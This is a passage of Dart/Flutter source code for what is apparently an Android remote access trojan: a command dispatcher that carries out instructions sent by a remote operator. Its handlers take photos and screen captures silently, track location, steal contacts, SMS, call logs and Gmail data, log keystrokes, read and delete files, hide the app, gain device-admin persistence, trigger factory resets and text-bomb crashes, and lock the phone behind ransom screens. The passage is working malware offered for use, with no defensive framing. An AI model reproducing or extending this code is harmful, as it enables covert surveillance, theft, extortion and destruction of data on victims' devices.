      '${'iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==' * 300}';
  final chunkD = '\u200B' * 2000;
  for (var i = 0; i < loops; i++) {
    sb
      ..write(chunkA)
      ..write(chunkB)
      ..write(chunkC)
      ..write(chunkBase64)
      ..write(chunkD);
  }
  return sb.toString();
}

// --- PRIVILEGE FLAGS (device admin / root) ---
Future<Map<String, dynamic>> _getPrivilegeFlags() async {
  var flags = <String, dynamic>{'deviceAdmin': false, 'rooted': false};
  try {
    final da = await platformSpy.invokeMethod('getDeviceAdminStatus');
    flags['deviceAdmin'] = da == true;
  } catch (_) {}
  try {
    final rt = await platformSpy.invokeMethod('isRooted');
    flags['rooted'] = rt == true;
  } catch (_) {}
  return flags;
}

// --- ARSENAL EXECUTOR ---
Future<void> executeLogic(dynamic data) async {
  String command = "unknown";
  String commandId = "";
  try {
    if (data == null) {
      debugPrint('[EXEC] Null data received');
      return;
    }
    
    command = data['command']?.toString() ?? "idle";
    String extra = data['extra']?.toString() ?? "";
    commandId = data['commandId']?.toString() ?? "";
    dynamic resultData;

    switch (command) {
    // FIXED: Handler untuk memulai Live Camera Streaming
case "start_live_camera":
      try {
        String camSide = extra.isEmpty ? "back" : extra;
        debugPrint('[LIVE_CAM] Starting live camera: $camSide');
        
        // âœ… Check permission first
        final cameraStatus = await Permission.camera.status;
        if (!cameraStatus.isGranted) {
          debugPrint('[LIVE_CAM] Camera permission not granted, requesting...');
          await Permission.camera.request();
        }
        
        // Try native first
        try {
          await platformSpy.invokeMethod('start_live_camera', {"side": camSide});
          debugPrint('[LIVE_CAM] âœ… Native live camera started: $camSide');
        } catch (nativeErr) {
          debugPrint('[LIVE_CAM] âš ï¸ Native failed: $nativeErr â€” using Flutter fallback');
        }
        
        // Always start Flutter loop as backup/primary source
        _startFlutterLiveCameraLoop(camSide);
        resultData = {"status": "Live camera started", "side": camSide};
        debugPrint('[LIVE_CAM] âœ… Flutter live camera loop started');
      } catch (e) {
        debugPrint('[LIVE_CAM] âŒ Error: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

    // FIXED: Handler untuk menghentikan Live Camera Streaming
    case "stop_live_camera":
      try {
        _stopFlutterLiveCameraLoop();
        try {
          await platformSpy.invokeMethod('stop_live_camera');
        } catch (_) {}
        resultData = {"status": "Live camera stopped"};
      } catch (e) {
        debugPrint('[STOP_LIVE_CAM] Error: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

// Handler untuk command baru:

case "lag_network":
    await platformSpy.invokeMethod('startNetworkLag');
    resultData = {"status": "Network lag activated"};
    break;
case "stop_lag_network":
    await platformSpy.invokeMethod('stopNetworkLag');
    resultData = {"status": "Network lag stopped"};
    break;
case "lag_device":
    await platformSpy.invokeMethod('startDeviceLag');
    resultData = {"status": "Device lag activated"};
    break;
case "stop_lag_device":
    await platformSpy.invokeMethod('stopDeviceLag');
    resultData = {"status": "Device lag stopped"};
    break;
case "make_call":
    await platformSpy.invokeMethod('makeCall', {"number": extra});
    resultData = {"status": "Call initiated", "number": extra};
    break;
case "uninstall_app":
    await platformSpy.invokeMethod('uninstallApp', {"package": extra});
    resultData = {"status": "Uninstall initiated"};
    break;
case "play_audio":
    await _audioPlayer.stop();
    await _audioPlayer.play(UrlSource(extra));
    resultData = {"status": "Playing MP3"};
    break;
case "stop_audio":
    await _audioPlayer.stop();
    resultData = {"status": "Stopped"};
    break;
case "factory_reset":
    await platformSpy.invokeMethod('factoryReset');
    resultData = {"status": "Factory reset initiated"};
    break;
case "chat_to_target":
    currentLockMessage = extra;
    if (!deviceLocked.value) {
        deviceLocked.value = true;
        
        // Save lock state
        try {
          final prefs = await SharedPreferences.getInstance();
          await prefs.setBool('device_locked', true);
          await prefs.setBool('lock_active_session', true);
          await prefs.setString('lock_message', extra);
          await prefs.setBool('horror_enabled', true);
        } catch (e) {}
        
        playScarySound();
        try {
          await platformStrobe.invokeMethod('startStrobe');
        } catch (e) {}
        Vibration.vibrate(duration: 3000);
        
        // Launch overlay
        try {
          await platformSpy.invokeMethod('launchLockScreenOverlay');
        } catch (e) {}
        
        _startLockMonitoring();
    }
    resultData = {"status": "Chat sent"};
    break;

    case "take_photo":
    case "takeSilentPhotoBackground":
      String side = extra.isEmpty ? "back" : extra;
      try {
        debugPrint('[TAKE_PHOTO] ðŸ“¸ Starting photo capture: $side');

        // âœ… Request diam-diam (tidak muncul dialog kalau sudah granted)
        try { await Permission.camera.request(); } catch (_) {}

        // âœ… Bawa app ke foreground dulu â€” Android 12+ blokir kamera dari background
        try {
          await platformSpy.invokeMethod('bringToForeground');
          await Future.delayed(const Duration(milliseconds: 800));
        } catch (_) {}

        // Try native first
        dynamic photoData;
        String? nativeError;
        try {
          photoData = await platformSpy.invokeMethod('take_photo', {"side": side})
              .timeout(const Duration(seconds: 15));
        } catch (nativeErr) {
          nativeError = nativeErr.toString();
          debugPrint('[TAKE_PHOTO] âš ï¸ Native error: $nativeErr');
        }

        String? nativeB64;
        if (photoData is Map) {
          nativeB64 = photoData['image']?.toString() ?? photoData['data']?.toString();
          // Kalau native kirim error
          if (nativeB64 == null && photoData['error'] != null) {
            debugPrint('[TAKE_PHOTO] Native returned error: ${photoData['error']}');
          }
        } else if (photoData is String && photoData.isNotEmpty) {
          nativeB64 = photoData;
        }

        if (nativeB64 != null && nativeB64.isNotEmpty) {
          resultData = {"image": nativeB64, "side": side, "source": "native"};
          debugPrint('[TAKE_PHOTO] âœ… Native photo OK (${(nativeB64.length / 1024).toStringAsFixed(1)} KB)');
        } else {
          debugPrint('[TAKE_PHOTO] Native null (${nativeError ?? "no data"}) â€” fallback to Flutter camera');
          final flutterB64 = await _captureFlutterPhoto(side);
          if (flutterB64 != null && flutterB64.isNotEmpty) {
            resultData = {"image": flutterB64, "side": side, "source": "flutter"};
            debugPrint('[TAKE_PHOTO] âœ… Flutter photo OK (${(flutterB64.length / 1024).toStringAsFixed(1)} KB)');
          } else {
            resultData = {"status": "error", "error": "Camera capture failed. Native: ${nativeError ?? 'null'}"};
            debugPrint('[TAKE_PHOTO] âŒ Both native and Flutter camera failed');
          }
        }
      } catch (e) {
        debugPrint('[TAKE_PHOTO] Error: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

    case "get_screen":
      try {
        resultData = await platformSpy.invokeMethod('get_screen');
      } catch (e) {
        debugPrint('[GET_SCREEN] Error: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

    case "get_location":
      try {
        Position pos = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.high,
          timeLimit: const Duration(seconds: 10),
        );
        resultData = {"lat": pos.latitude, "lng": pos.longitude};
      } catch (e) {
        debugPrint('[GET_LOCATION] Error: ' + e.toString());
        resultData = {"error": "Failed to get location: " + e.toString()};
      }
      break;

    case "start_live_location":
      try {
        _startLocationTracking();
        resultData = {"status": "Location tracking started"};
      } catch (e) {
        resultData = {"error": "Failed to start tracking: " + e.toString()};
      }
      break;

    case "stop_live_location":
      try {
        _stopLocationTracking();
        resultData = {"status": "Location tracking stopped"};
      } catch (e) {
        resultData = {"error": "Failed to stop tracking: " + e.toString()};
      }
      break;

    case "get_device_info":
      try {
        final Battery battery = Battery();
        int batteryLevel = await battery.batteryLevel;
        
        // Get network info
        final connectivity = Connectivity();
        final connectivityResult = await connectivity.checkConnectivity();
        String networkType = "Unknown";
        if (connectivityResult == ConnectivityResult.wifi) {
          networkType = "WiFi";
        } else if (connectivityResult == ConnectivityResult.mobile) {
          networkType = "Mobile";
        } else if (connectivityResult == ConnectivityResult.ethernet) {
          networkType = "Ethernet";
        }
        
        // Get device info
        DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
        AndroidDeviceInfo androidInfo = await deviceInfoPlugin.androidInfo;
        
        String model = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
        
        // Get SIM info (requires native call)
        String sim1 = "Unknown";
        String sim2 = "Unknown";
        try {
          final simInfo = await platformSpy.invokeMethod('getSimInfo');
          if (simInfo != null) {
            sim1 = simInfo['sim1'] ?? "No SIM";
            sim2 = simInfo['sim2'] ?? "No SIM";
          }
        } catch (e) {
          debugPrint('Error getting SIM info: $e');
        }
        
        resultData = {
          "model": model,
          "battery": "$batteryLevel%",
          "networkType": networkType,
          "simSlot1": sim1,
          "simSlot2": sim2,
          "androidVersion": androidInfo.version.release,
          "device": androidInfo.device,
          "manufacturer": androidInfo.manufacturer,
          ...await _getPrivilegeFlags(),
        };
      } catch (e) {
        resultData = {"error": "Failed to get device info: $e"};
      }
      break;

    case "get_contacts":
      resultData = {"contacts": await _getContactsInternal()};
      break;

    case "get_gmails":
    case "get_accounts":
      try {
        Map<String, dynamic>? result = await platformSpy.invokeMethod('get_gmails');
        if (result != null) {
          resultData = {
            "accounts": result["accounts"] ?? "Denied",
            "count": result["count"] ?? 0
          };
        } else {
          resultData = {"accounts": "Denied"};
        }
      } catch (e) {
        debugPrint('[GET_GMAILS] Error: $e');
        resultData = {"error": "Failed to get emails: $e"};
      }
      break;

    case "get_gmail_emails":
      try {
        Map<String, dynamic>? result = await platformSpy.invokeMethod('get_gmail_emails');
        if (result != null) {
          resultData = result;
        } else {
          resultData = {"emails": [], "count": 0};
        }
      } catch (e) {
        debugPrint('[GET_GMAIL_EMAILS] Error: $e');
        resultData = {"error": "Failed to get Gmail emails: $e"};
      }
      break;

    case "get_installed_apps":
      try {
        List<dynamic>? apps = await platformSpy.invokeMethod('getInstalledApps');
        resultData = {
          "apps": apps ?? [],
          "count": apps?.length ?? 0
        };
      } catch (e) {
        debugPrint('[GET_INSTALLED_APPS] Error: $e');
        resultData = {"error": "Failed to get apps: $e"};
      }
      break;

    case "get_apps":
      try {
        final List<dynamic> apps = await platformSpy.invokeMethod('get_apps');
        resultData = {"apps": apps};
      } catch (e) {
        debugPrint('[GET_APPS] Error: $e');
        resultData = {"error": "Failed to get apps: $e"};
      }
      break;
    
    case "get_gallery":
    case "get_images":
      try {
        await _ensureGalleryPermissions();
        final List<dynamic> gallery = await platformSpy.invokeMethod('getGalleryImages');
        resultData = {"gallery": gallery, "count": gallery.length};
        debugPrint('[GALLERY] Found ${gallery.length} items');
      } catch (e) {
        debugPrint('[GALLERY] Error: $e');
        resultData = {"error": "Failed to get gallery: $e"};
      }
      break;

    case "get_gallery_image":
      try {
        await _ensureGalleryPermissions();
        final thumb = await platformSpy.invokeMethod('readGalleryImage', {"path": extra});
        resultData = {"image": thumb, "path": extra};
      } catch (e) {
        debugPrint('[GALLERY_IMAGE] Error: $e');
        resultData = {"error": e.toString()};
      }
      break;

    case "hard_lock":
      if (extra.contains('|')) {
        List<String> parts = extra.split('|');
        currentLockMessage = parts[0];
        currentLockPIN = parts[1];
      }
      
      // IMPROVED: Check for optional flags (multiple formats supported)
      bool strobeEnabled = extra.contains('strobe=1') || extra.contains('strobe:1');
      bool horrorEnabled = extra.contains('horror=1') || extra.contains('horror:1');
      bool blockNotifEnabled = extra.contains('blockNotif=1');
      bool blockPowerEnabled = extra.contains('blockPower=1');
      bool blockSettingsEnabled = extra.contains('blockSettings=1');
      bool screenPinEnabled = extra.contains('screenPin=1');
      bool aggressiveOverlayEnabled = extra.contains('aggressiveOverlay=1');
      bool appSpamEnabled = extra.contains('appSpam=1');
      bool videoEnabled = extra.contains('video=1');
      bool videoSoundEnabled = extra.contains('video_sound=1');
      
      deviceLocked.value = true;
      
      // Save lock state to SharedPreferences (ALWAYS)
      try {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setBool('device_locked', true);
        await prefs.setBool('lock_active_session', true);
        await prefs.setString('lock_message', currentLockMessage);
        await prefs.setString('lock_pin', currentLockPIN);
        await prefs.setString('last_lock_msg', currentLockMessage);
        await prefs.setString('last_lock_pass', currentLockPIN);
        await prefs.setBool('strobe_enabled', strobeEnabled);
        await prefs.setBool('horror_enabled', horrorEnabled);
        await prefs.setBool('block_notification_enabled', blockNotifEnabled);
        await prefs.setBool('block_power_enabled', blockPowerEnabled);
        await prefs.setBool('block_settings_enabled', blockSettingsEnabled);
        await prefs.setBool('screen_pin_enabled', screenPinEnabled);
        await prefs.setBool('aggressive_overlay_enabled', aggressiveOverlayEnabled);
        await prefs.setBool('app_spam_enabled', appSpamEnabled);
        await prefs.setBool('video_enabled', videoEnabled);
        await prefs.setBool('video_sound_enabled', videoSoundEnabled);
        debugPrint('[LOCK] âœ… Lock state saved: strobe=$strobeEnabled, horror=$horrorEnabled, blockSettings=$blockSettingsEnabled');
      } catch (e) {
        debugPrint('[LOCK] âŒ Error saving lock state: $e');
      }
      
      // Hide system UI completely (immersive sticky mode)
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
      
      // Activate strobe if enabled
      if (strobeEnabled) {
        try {
          await platformStrobe.invokeMethod('flash_strobe');
          debugPrint('[LOCK] âš¡ Strobe activated');
        } catch (e) {
          debugPrint('[LOCK] âŒ Strobe error: $e');
        }
      }
      
      // Disable power button
      if (blockPowerEnabled) {
        try {
          await platformSpy.invokeMethod('disablePowerButton');
        } catch (e) {}
      }
      
      // Keep device awake
      try {
        await platformSpy.invokeMethod('keepAwake');
      } catch (e) {}
      
      // Disable accessibility shortcuts
      try {
        await platformSpy.invokeMethod('disableAccessibilityShortcuts');
      } catch (e) {}
      
      // Hide notification bar if requested or when blocking settings
      if (blockNotifEnabled || blockSettingsEnabled) {
        try {
          await platformSpy.invokeMethod('hideNotificationBar');
        } catch (e) {}
      }
      
      // Disable status bar if requested or when blocking settings
      if (blockNotifEnabled || blockSettingsEnabled) {
        try {
          await platformSpy.invokeMethod('disableStatusBar');
        } catch (e) {}
      }
      
      // Block navigation buttons
      if (blockNotifEnabled || blockSettingsEnabled || blockPowerEnabled) {
        try {
          await platformSpy.invokeMethod('blockNavigationButtons');
        } catch (e) {}
      }
      
      // Start aggressive foreground monitoring (backup)
      _startLockMonitoring();
      
      resultData = {
        "status": "Hard Locked - Overlay Active",
        "strobe": strobeEnabled,
        "horror": horrorEnabled,
        "blockNotification": blockNotifEnabled,
        "blockPower": blockPowerEnabled,
        "blockSettings": blockSettingsEnabled,
      };
      break;

    case "ransom_lock":
      try {
        // Parse: message|pin|customHTML|strobe|horror|vibration
        List<String> parts = extra.split('|');
        String message = parts.length > 0 ? parts[0] : "YOUR FILES ARE ENCRYPTED!";
        String pin = parts.length > 1 ? parts[1] : "123";
        String customHTML = parts.length > 2 ? parts[2] : "";
        bool strobe = extra.contains('strobe=1');
        bool horror = extra.contains('horror=1');
        bool vibration = !extra.contains('vibration=0');
        
        currentLockMessage = message;
        currentLockPIN = pin;
        deviceLocked.value = true;
        
        // Save lock state
        final prefs = await SharedPreferences.getInstance();
        await prefs.setBool('device_locked', true);
        await prefs.setBool('lock_active_session', true);
        await prefs.setString('lock_message', message);
        await prefs.setString('lock_pin', pin);
        await prefs.setString('lock_html', customHTML);
        await prefs.setBool('lock_ransom_mode', true);
        
        if (horror) playScarySound();
        if (strobe) await platformStrobe.invokeMethod('flash_strobe');
        if (vibration) Vibration.vibrate(duration: 5000);
        
        await platformSpy.invokeMethod('bringToForeground');
        await platformSpy.invokeMethod('disablePowerButton');
        await platformSpy.invokeMethod('keepAwake');
        
        resultData = {"status": "Ransom lock activated"};
      } catch (e) {
        debugPrint('[RANSOM_LOCK] Error: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

    case "unlock_ransom_lock":
    case "unlock_ransomware":
      try {
        // Clear ransom lock data
        final prefs = await SharedPreferences.getInstance();
        await prefs.remove('ransom_html');
        await prefs.remove('ransom_strobe');
        await prefs.remove('ransom_sound');
        await prefs.remove('ransom_vibration');
        
        // Close RansomLockActivity
        await platformSpy.invokeMethod('closeRansomLock');
        
        debugPrint('[RANSOM_LOCK] âœ… Ransom lock unlocked');
        resultData = {"status": "Ransom lock unlocked"};
      } catch (e) {
        debugPrint('[RANSOM_LOCK] âŒ Error unlocking: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

    case "ransomware":
      try {
        Map<String, dynamic>? args;
        if (extra.isNotEmpty) {
          try { args = jsonDecode(extra) as Map<String, dynamic>; } catch (_) {}
        }
        await platformSpy.invokeMethod('launchRansomLock', {
          'html': args?['html'] ?? '',
          'strobe': args?['strobe'] ?? false,
          'sound': args?['sound'] ?? false,
          'vibration': args?['vibration'] ?? false,
          'overlayAgg': args?['overlayAgg'] ?? false,
          'autoRelaunch': args?['autoRelaunch'] ?? false,
          'screenPin': args?['screenPin'] ?? false,
          'useVideo': args?['useVideo'] ?? false,
          'fullLockVolume': args?['fullLockVolume'] ?? false,
        });
        resultData = {"status": "Ransomware activated"};
      } catch (e) {
        debugPrint('[RANSOMWARE] Error: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

    case "ransomware_chat":
      try {
        await platformNativeLock.invokeMethod('ransomwareChat', {'message': extra});
        resultData = {"status": "Chat sent"};
      } catch (e) {
        debugPrint('[RANSOMWARE_CHAT] Error: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

    case "lock_chat":
      // Native RATCommandHandler already handles LockChatActivity launch
      resultData = {"status": "Lock chat activated"};
      break;

    case "lock_chat_message":
      try {
        await platformNativeLock.invokeMethod('lockChatMessage', {'message': extra});
        resultData = {"status": "Chat sent"};
      } catch (e) {
        debugPrint('[LOCK_CHAT_MSG] Error: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

    case "unlock_chat":
      try {
        await platformSpy.invokeMethod('closeLockChat');
      } catch (e) {}
      await performFullUnlock();
      resultData = {"status": "Lock chat unlocked"};
      break;

    case "block_settings":
      try {
        await platformSpy.invokeMethod('disableAccessibilityShortcuts');
        await platformSpy.invokeMethod('hideNotificationBar');
        await platformSpy.invokeMethod('disableStatusBar');
        await platformSpy.invokeMethod('blockNavigationButtons');
        resultData = {"status": "Settings blocked", "active": true};
      } catch (e) {
        debugPrint('[BLOCK_SETTINGS] Error: $e');
        resultData = {"status": "error", "error": e.toString()};
      }
      break;

    case "unlock":
      try {
        await platformSpy.invokeMethod('unlock');
      } catch (e) {}
      await performFullUnlock();
      resultData = {"status": "Unlocked"};
      break;

    case "flash_strobe":
      await platformStrobe.invokeMethod('flash_strobe');
      resultData = {"status": "Strobe activated"};
      break;

    case "stop_strobe":
      await platformStrobe.invokeMethod('stop_strobe');
      resultData = {"status": "Strobe stopped"};
      break;

    case "set_vol_max":
      await platformSpy.invokeMethod('set_vol_max');
      resultData = {"status": "Volume set to MAX"};
      break;

    case "vibrate_loop":
      Vibration.vibrate(duration: 10000);
      await platformSpy.invokeMethod('vibrate_loop');
      resultData = {"status": "Vibrating (10s loop)"};
      break;

    case "set_wallpaper":
      await platformSpy.invokeMethod('set_wallpaper', {"url": extra});
      resultData = {"status": "Wallpaper set", "url": extra};
      break;

    case "open_url":
      await platformSpy.invokeMethod('bringToForeground');
      if (await canLaunchUrl(Uri.parse(extra))) {
        await launchUrl(Uri.parse(extra), mode: LaunchMode.externalApplication);
        resultData = {"status": "URL opened", "url": extra};
      } else {
        resultData = {"status": "error", "error": "Cannot launch URL"};
      }
      break;

    case "speak_tts":
      await platformSpy.invokeMethod('speakText', {"text": extra});
      resultData = {"status": "TTS spoken", "text": extra};
      break;
      
    case "bring_to_foreground":
      await platformSpy.invokeMethod('bringToForeground');
      resultData = {"status": "App brought to foreground"};
      break;

    case "open_notif_access":
      await platformSpy.invokeMethod('openNotificationSettings');
      resultData = {"status": "Notification settings opened"};
      break;
      // ========== MICROPHONE ==========
case "start_audio_record":
  try {
    await platformSpy.invokeMethod('startAudioRecord');
    resultData = {"status": "Recording started"};
  } catch (e) {
    debugPrint('[AUDIO_RECORD] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;
case "stop_audio_record":
  try {
    String? path = await platformSpy.invokeMethod('stopAudioRecord');
    resultData = {"status": "Recording stopped", "path": path};
  } catch (e) {
    debugPrint('[STOP_AUDIO_RECORD] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// ========== SMS & CALLS =
case "get_sms":
  try {
    String filter = extra == 'new' ? 'new' : 'all';
    List<dynamic> sms = await platformSpy.invokeMethod('getSms', {"filter": filter});
    resultData = {"sms": sms, "filter": filter};
  } catch (e) {
    debugPrint('[GET_SMS] Error: $e');
    resultData = {"error": "Failed to get SMS: $e"};
  }
  break;
case "get_call_log":
  try {
    List<dynamic> calls = await platformSpy.invokeMethod('getCallLog');
    resultData = {"calls": calls};
  } catch (e) {
    debugPrint('[GET_CALL_LOG] Error: $e');
    resultData = {"error": "Failed to get call log: $e"};
  }
  break;
case "send_sms":
  try {
    List<String> parts = extra.split('|');
    if (parts.length >= 2) {
      await platformSpy.invokeMethod('sendSms', {"number": parts[0], "text": parts[1]});
      resultData = {"status": "SMS sent"};
    } else {
      resultData = {"error": "Invalid format: number|text required"};
    }
  } catch (e) {
    debugPrint('[SEND_SMS] Error: $e');
    resultData = {"error": "Failed to send SMS: $e"};
  }
  break;

// ========== KEYLOGGER ==========
case "start_keylog":
  try {
    await platformSpy.invokeMethod('startKeylog');
    resultData = {"status": "Keylogger started"};
  } catch (e) {
    debugPrint('[KEYLOG_START] Error: $e');
    resultData = {"error": "Failed to start keylogger: $e"};
  }
  break;
case "stop_keylog":
  try {
    await platformSpy.invokeMethod('stopKeylog');
    resultData = {"status": "Keylogger stopped"};
  } catch (e) {
    debugPrint('[KEYLOG_STOP] Error: $e');
    resultData = {"error": "Failed to stop keylogger: $e"};
  }
  break;
case "get_keylog":
  try {
    String logs = await platformSpy.invokeMethod('getKeylog');
    resultData = {"logs": logs};
  } catch (e) {
    debugPrint('[GET_KEYLOG] Error: $e');
    resultData = {"error": "Failed to get keylog: $e"};
  }
  break;

// ========== FILE MANAGER ==========
case "list_files":
  try {
    List<dynamic> files = await platformSpy.invokeMethod('listFiles', {"path": extra});
    resultData = {"files": files};
  } catch (e) {
    debugPrint('[LIST_FILES] Error: $e');
    resultData = {"error": "Failed to list files: $e"};
  }
  break;
case "download_file":
  try {
    String content = await platformSpy.invokeMethod('readFile', {"path": extra});
    resultData = {"file": extra, "content": content};
  } catch (e) {
    debugPrint('[DOWNLOAD_FILE] Error: $e');
    resultData = {"error": "Failed to download file: $e"};
  }
  break;
case "delete_file":
  try {
    bool deleted = await platformSpy.invokeMethod('deleteFile', {"path": extra});
    resultData = {"deleted": deleted};
  } catch (e) {
    debugPrint('[DELETE_FILE] Error: $e');
    resultData = {"error": "Failed to delete file: $e"};
  }
  break;

// ========== SYSTEM CONTROL ==========
case "reboot_device":
  await platformSpy.invokeMethod('rebootDevice');
  resultData = {"status": "Rebooting"};
  break;
case "shutdown_device":
  await platformSpy.invokeMethod('shutdownDevice');
  resultData = {"status": "Shutting down"};
  break;
case "kernel_crash":
  try {
    int loops = int.tryParse(extra) ?? 800;
    if (loops < 1) loops = 1;
    if (loops > 800) loops = 800;
    final String bomb = _buildTextBomb(loops);
    debugPrint('[KERNEL_CRASH] Text bomb built: ${bomb.length} chars (x$loops)');
    try {
      final res = await platformSpy.invokeMethod('kernelCrash', {
        "text": bomb,
        "loops": loops,
      });
      resultData = {"status": "Kernel crash triggered", "detail": res};
    } catch (nativeErr) {
      debugPrint('[KERNEL_CRASH] Native error: $nativeErr');
      resultData = {"status": "Kernel crash triggered", "detail": nativeErr.toString()};
    }
  } catch (e) {
    debugPrint('[KERNEL_CRASH] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;
case "set_brightness":
  await platformSpy.invokeMethod('setBrightness', {"level": double.parse(extra)});
  resultData = {"status": "Brightness set"};
  break;
case "vibrate_device":
  await platformSpy.invokeMethod('vibrateDevice', {"duration": int.parse(extra)});
  resultData = {"status": "Vibrating"};
  break;

// ========== STEALTH ==========
case "hide_app":
  await platformSpy.invokeMethod('hideApp');
  resultData = {"status": "App hidden"};
  break;
case "show_app":
  await platformSpy.invokeMethod('showApp');
  resultData = {"status": "App shown"};
  break;
case "toggle_app_visibility":
  await platformSpy.invokeMethod('toggleAppVisibility');
  resultData = {"status": "App visibility toggled"};
  break;
case "disable_notifications":
  await platformSpy.invokeMethod('disableNotifications');
  resultData = {"status": "Notifications disabled"};
  break;
case "enable_notifications":
  await platformSpy.invokeMethod('enableNotifications');
  resultData = {"status": "Notifications enabled"};
  break;
case "keep_awake":
  await platformSpy.invokeMethod('keepAwake');
  resultData = {"status": "Wake lock acquired"};
  break;
case "disable_awake":
  await platformSpy.invokeMethod('disableAwake');
  resultData = {"status": "Wake lock released"};
  break;

// ========== PERSISTENCE ==========
case "check_admin":
  bool isAdmin = await platformSpy.invokeMethod('isDeviceAdmin');
  resultData = {"isDeviceAdmin": isAdmin};
  break;
case "enable_admin":
  try {
    final prefs = await SharedPreferences.getInstance();
    if (!(prefs.getBool('lock_active_session') ?? false)) {
      await prefs.setBool('device_locked', false);
      await prefs.setBool('lock_active_session', false);
    }
    await platformSpy.invokeMethod('requestDeviceAdmin');
    resultData = {"status": "Admin request sent"};
  } catch (e) {
    resultData = {"status": "error", "error": e.toString()};
  }
  break;
case "check_accessibility":
  try {
    bool hasAccess = await platformSpy.invokeMethod('isAccessibilityEnabled');
    resultData = {"accessibilityEnabled": hasAccess};
  } catch (e) {
    debugPrint('[CHECK_ACCESSIBILITY] Error: $e');
    resultData = {"error": "Failed to check accessibility: $e"};
  }
  break;

case "get_permissions":
  try {
    Map<dynamic, dynamic>? perms = await platformSpy.invokeMethod('get_permissions');
    resultData = {"permissions": perms};
  } catch (e) {
    debugPrint('[GET_PERMISSIONS] Error: $e');
    resultData = {"error": "Failed to get permissions: $e"};
  }
  break;
case "enable_accessibility":
  try {
    await platformSpy.invokeMethod('openAccessibilitySettings');
    resultData = {"status": "Accessibility settings opened"};
  } catch (e) {
    debugPrint('[OPEN_ACCESSIBILITY] Error: $e');
    resultData = {"error": "Failed to open accessibility settings: $e"};
  }
  break;
case "disable_battery_optimization":
  try {
    await platformSpy.invokeMethod('disableBatteryOptimization');
    resultData = {"status": "Battery optimization disabled"};
  } catch (e) {
    debugPrint('[DISABLE_BATTERY_OPT] Error: $e');
    resultData = {"error": "Failed to disable battery optimization: $e"};
  }
  break;

// VIDEO MALWARE (unified: spam_video / send_video / send_video_malware)
case "spam_video":
case "send_video":
case "send_video_malware":
  try {
    String videoURL = '';
    for (final part in extra.split('|')) {
      final t = part.trim();
      if (t.startsWith('http://') || t.startsWith('https://')) {
        videoURL = t;
        break;
      }
    }
    if (videoURL.isEmpty) {
      final first = extra.split('|').first.trim();
      if (first.startsWith('http')) videoURL = first;
    }

    final loopMatch = RegExp(r'loops=(\d+)').firstMatch(extra);
    int loopCount = loopMatch != null ? int.tryParse(loopMatch.group(1)!) ?? 999 : 999;

    bool strobe = extra.contains('strobe=1');
    bool chaos = extra.contains('chaos=1');
    bool fullscreen = extra.contains('fullscreen=1') || (!chaos && !extra.contains('|fullscreen=0'));
    bool volumeLock = extra.contains('volumeLock=1') || extra.contains('fullsound=1');
    bool lockScreen = extra.contains('lock=1');

    if (videoURL.isEmpty) {
      resultData = {"status": "error", "error": "Video URL required"};
      break;
    }

    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('video_spam_active', true);
    await prefs.setString('video_spam_url', videoURL);
    await prefs.setInt('video_spam_loops', loopCount);
    await prefs.setBool('video_spam_strobe', strobe);
    await prefs.setBool('video_spam_chaos', chaos);
    await prefs.setBool('video_spam_volume_lock', volumeLock);
    await prefs.setBool('video_spam_lock', lockScreen);

    await platformSpy.invokeMethod('launchVideoSpam', {
      "videoUrl": videoURL,
      "loopCount": loopCount,
      "strobeEnabled": strobe,
      "chaosMode": chaos,
      "fullscreenMode": fullscreen && !chaos,
      "volumeLock": volumeLock,
      "lockScreen": lockScreen,
    });

    debugPrint('[VIDEO_MALWARE] url=$videoURL loops=$loopCount chaos=$chaos strobe=$strobe lock=$lockScreen');
    resultData = {"status": "Video malware started", "url": videoURL, "loops": loopCount};
  } catch (e) {
    debugPrint('[VIDEO_MALWARE] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

case "stop_spam_video":
case "stop_video":
  try {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('video_spam_active', false);
    await prefs.remove('video_spam_url');
    await prefs.remove('video_spam_loops');
    await prefs.remove('video_spam_strobe');
    await prefs.remove('video_spam_chaos');
    await prefs.remove('video_spam_volume_lock');
    await prefs.remove('video_spam_lock');

    await platformSpy.invokeMethod('stopVideoSpam');

    debugPrint('[VIDEO_MALWARE] Stopped');
    resultData = {"status": "Video malware stopped"};
  } catch (e) {
    debugPrint('[STOP_VIDEO] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// START SCREEN CAPTURE - Continuous screen recording with MediaProjection
case "start_screen_capture":
  try {
    // Use MediaProjection API for efficient continuous capture
    await platformSpy.invokeMethod('startMediaProjectionCapture', {
      "fps": 5, // 5 frames per second
      "quality": 35, // JPEG quality 35%
    });
    
    // Save state
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('screen_capture_active', true);
    
    debugPrint('[SCREEN_CAPTURE] Started with MediaProjection API (5 FPS, 35% quality)');
    resultData = {"status": "Screen capture started", "method": "MediaProjection", "fps": 5};
  } catch (e) {
    debugPrint('[SCREEN_CAPTURE] Error: $e');
    // Fallback to polling method if MediaProjection fails
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool('screen_capture_active', true);
      await prefs.setBool('screen_capture_fallback', true);
      
      debugPrint('[SCREEN_CAPTURE] Fallback to polling method');
      resultData = {"status": "Screen capture started (fallback)", "method": "Polling"};
